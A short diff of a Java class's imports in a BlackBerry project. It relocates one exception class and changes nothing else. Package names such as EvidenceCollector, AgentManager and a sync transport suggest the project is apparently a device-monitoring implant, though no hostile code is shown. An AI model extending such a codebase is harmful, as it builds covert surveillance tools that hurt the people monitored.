@@ -5,6 +5,7 @@ import java.util.Vector;
 import net.rim.device.api.system.Backlight;
 import blackberry.AgentManager;
 import blackberry.action.SubAction;
+import blackberry.action.sync.protocol.ProtocolException;
 import blackberry.action.sync.protocol.ZProtocol;
 import blackberry.action.sync.transport.Transport;
 import blackberry.agent.Agent;
@@ -13,7 +14,6 @@ import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceCollector;
-import blackberry.transfer.ProtocolException;
 import blackberry.utils.Check;
 
 public abstract class SyncAction extends SubAction {
